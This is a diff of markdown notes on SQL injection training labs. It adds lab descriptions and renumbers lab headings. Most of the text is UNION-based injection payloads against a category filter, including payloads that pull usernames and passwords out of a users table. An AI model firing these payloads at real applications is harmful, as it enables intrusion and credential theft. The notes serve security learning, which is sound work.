@@ -1,19 +1,19 @@
-Table of contents
----
-[toc]
 # Examining the database in SQL injection attacks
 
 Query to examining the database version
 
-| Database type | Query |
-| ------------- | ------| 
-|Microsoft 		|	SELECT @@version |
+| Database type | 			Query	 		|
+|--- 			|---				 		| 
+|Microsoft 		|	SELECT @@version 		|
 |Oracle 		|	SELECT * FROM v$version |
-|PostgreSQL 	| 	SELECT version() |
-|MySQL 			|	SELECT @@version |
+|PostgreSQL 	| 	SELECT version() 		|
+|MySQL 			|	SELECT @@version 		|
 
 # Labs
-## Lab #1: SQL injection attack, querying the database type and version on Oracle
+## Lab #7: SQL injection attack, querying the database type and version on Oracle
+> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+>
+> To solve the lab, display the database version string. 
 
 Steps: 
 
@@ -36,11 +36,12 @@ UNION SELECT * FROM v$version where banner LIKE 'oracle%'--
 
 ```
 
-## Lab #2: SQL injection attack, querying the database type and version on MySQL and Microsoft
+## Lab #8: SQL injection attack, querying the database type and version on MySQL and Microsoft
+> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+>
+> To solve the lab, display the database version string. 
 
-
-Steps
-
+Steps:
 1. Determine the number of column
 ```
 category=Pets' ORDER BY 1,2 #
@@ -58,7 +59,12 @@ category=Pets' UNION SELECT banner, null FROM v$version --
 
 `#` = %23
 
-## Lab #2: SQL injection attack, listing the database contents on non-Oracle databases
+## Lab #9: SQL injection attack, listing the database contents on non-Oracle databases
+> This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+> 
+> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+>
+> To solve the lab, log in as the administrator user. 
 
 Steps:
 
@@ -87,7 +93,12 @@ category=Pets' union select username_grhpij, password_rhddiy from users_rfankd -
 category=Pets' union select username_grhpij || ':' || password_rhddiy, null from users_rfankd -- 
 ```
 
-## Lab #3: SQL injection attack, listing the database contents on Oracle
+## Lab #10: SQL injection attack, listing the database contents on Oracle
+>  This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+>
+> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+>
+> To solve the lab, log in as the administrator user. 
 
 steps:
 1. Determine the number of columns and columns data type
